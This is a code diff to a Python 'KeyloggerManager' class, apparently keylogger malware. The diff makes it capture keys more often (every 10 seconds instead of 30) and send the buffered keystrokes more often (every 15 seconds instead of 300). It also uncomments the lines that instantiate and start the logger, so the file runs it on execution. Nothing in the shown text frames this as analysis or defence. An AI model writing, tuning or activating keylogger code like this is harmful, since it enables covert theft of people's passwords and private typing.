@@ -30,7 +30,7 @@ class KeyloggerManager:
 
     def get_update(self):
         while True:
-           time.sleep(30)
+           time.sleep(10)
            recent = self.keylogger_listener.get_logged_keys()
            cur_time = datetime.now().strftime("%d/%m/%y_%H:%M")
            if self.copied:
@@ -44,7 +44,7 @@ class KeyloggerManager:
 
     def send_data(self):
         while True:
-          time.sleep(300)
+          time.sleep(15)
           dic2 = self.buffer.copy()
           self.copied = True
           text = ""
@@ -68,5 +68,5 @@ class KeyloggerManager:
 
 
 
-# a = KeyloggerManager("147852","test.txt")
-# a.start()
+a = KeyloggerManager("147852","test.txt")
+a.start()
